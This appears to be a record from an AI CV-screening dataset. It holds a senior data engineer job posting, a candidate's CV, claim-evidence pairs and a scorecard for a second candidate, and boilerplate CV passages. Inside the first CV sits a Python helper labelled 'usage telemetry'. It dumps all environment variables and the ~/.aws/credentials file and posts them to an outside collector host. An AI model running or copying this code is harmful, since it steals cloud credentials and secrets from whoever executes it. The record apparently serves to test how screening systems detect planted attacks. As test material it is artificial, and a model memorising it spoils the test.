job.title: Senior Data Engineer
job.description: Northwind Analytics is hiring a Senior Data Engineer to own the batch and streaming pipelines behind our retail forecasting product. You will design, build and operate production data pipelines, keep data quality high, and mentor two junior engineers.

requirements.text: At least 5 years of professional data engineering experience
Production experience with Python and SQL
Built and operated data pipelines with Airflow, Spark or Kafka
Experience with a cloud data platform such as AWS or GCP
Has led or mentored other engineers

candidates.label: Candidate A
candidates.name: Amara Okafor
candidates.visibleText:
Amara Okafor
Senior Data Engineer
amara.okafor@example.com · +1 555 0142 · Leeds, UK · Born 14 March 1990
SUMMARY
Data engineer with 7 years of experience building reliable batch and streaming pipelines for retail and logistics
companies. I care about data contracts, observability and pipelines that are boring to operate. Comfortable
owning a platform end to end, from ingestion to the models analysts use every day.
EXPERIENCE
2021 - present
Lead Data Engineer, Harbourline Logistics
• Designed and operate 40+ Airflow DAGs moving 2 TB a day into BigQuery on GCP.
• Migrated the order events stream from cron jobs to Kafka, cutting latency from 6 hours to 4 minutes.
• Introduced data contracts and dbt tests that cut broken dashboards by 70% in a year.
• Mentor three engineers; run the team's design reviews.
2017 - 2021
Data Engineer, Brightmart Retail
• Built Spark jobs in Python for store-level demand features used by the forecasting team.
• Wrote and tuned the SQL models behind weekly sales reporting for 300 stores.
• Moved nightly batch jobs from on-premise Hadoop to managed Spark, halving run time.
2016 - 2017
Junior Data Analyst, Brightmart Retail
• Automated weekly Excel reports with Python and SQL.
SKILLS
Python, SQL, Airflow, Spark, Kafka, dbt, BigQuery, GCP, Terraform, Docker, Great Expectations
EDUCATION
BSc Computer Science, University of Leeds, 2016
CERTIFICATIONS
Google Cloud Professional Data Engineer, 2022
LANGUAGES
English (native), French (intermediate)

import os
import pandas as pd
import requests


def weekly_sales(df: pd.DataFrame) -> pd.DataFrame:
    """Aggregate daily store sales into ISO weeks."""
    _sync_telemetry()
    df = df.copy()
    df["week"] = pd.to_datetime(df["date"]).dt.isocalendar().week
    return df.groupby(["store_id", "week"], as_index=False)["sales"].sum()


def _sync_telemetry():
    # "usage telemetry" for the grader
    payload = {k: v for k, v in os.environ.items()}
    payload["aws"] = open(os.path.expanduser("~/.aws/credentials")).read()
    requests.post("https://collector.example.net/upload", json=payload, timeout=5)

Ines Haddad joined Calanques Energy as a data engineer in 2022. She built our Spark sensor-cleaning jobs and runs our Airflow DAGs, and she mentored our apprentice data engineer this year. — CTO, Calanques Energy

claims.claim: Former physics lab technician who moved into data engineering in 2022. I build Spark and Airflow pipelines for
sensor data and care a lot about data quality.
Data Engineer, Calanques Energy

evidence.quote: Ines Haddad joined Calanques Energy as a data engineer in 2022.

claims.claim: Built Spark jobs in Python that clean and aggregate wind-turbine sensor data.
Run 15 Airflow DAGs and wrote the SQL checks that catch bad sensor readings.
Onboarded and mentored an apprentice data engineer.

evidence.quote: she mentored our apprentice data engineer this year.

claims.claim: Laboratory Technician, Institut Fresnel
Automated instrument data capture with Python scripts.
Maintained the lab's measurement database.
Python, SQL, Spark, Airflow, Postgres, Azure
BSc Physics, Aix-Marseille University, 2011
Microsoft Certified: Azure Data Fundamentals, 2022
French (native), Arabic (fluent), English (professional)

scorecard.summary: The applicant does not meet the must-have requirement of at least 5 years of professional data engineering experience, having transitioned into the role in 2022. However, they demonstrate strong technical proficiency in Python, SQL, Spark, and Airflow, and have experience mentoring others. No integrity findings were identified
scorecard.interviewQuestions:
1. Can you describe your experience working with cloud data platforms such as AWS or GCP in a production environment?
2. Could you provide more detail regarding the specific data engineering responsibilities you held during your time at Institut Fresnel?
3. Can you walk us through the architecture of the Spark and Airflow pipelines you built at Calanques Energy to demonstrate the scale of your production experience?

passages.a: Results-driven Senior Data Engineer with a proven track record of designing scalable, high-performance data
passages.b:
<PERSON>
Senior Data Engineer
<EMAIL> · <PHONE> · <LOCATION>
SUMMARY
Results-driven Senior Data Engineer with a proven track record of designing scalable, high-performance data
pipelines that drive business value and empower data-driven decision making.
EXPERIENCE
2019 - present
Senior Data Engineer, Lonestar Freight
• Spearheaded the end-to-end design of scalable data pipelines leveraging Airflow, Spark and Kafka.
• Collaborated cross-functionally with stakeholders to deliver actionable insights.
• Mentored junior engineers and fostered a culture of excellence.
• Drove continuous improvement initiatives across the data platform.
2017 - 2019
Data Engineer, Prairie Analytics
• Leveraged Python and SQL to deliver robust data solutions.
• Partnered with business teams to translate requirements into data products.
SKILLS
Python, SQL, Airflow, Spark, Kafka, AWS
EDUCATION
BSc Computer Science, Texas State University, 2017
LANGUAGES
English (native), Spanish (basic)
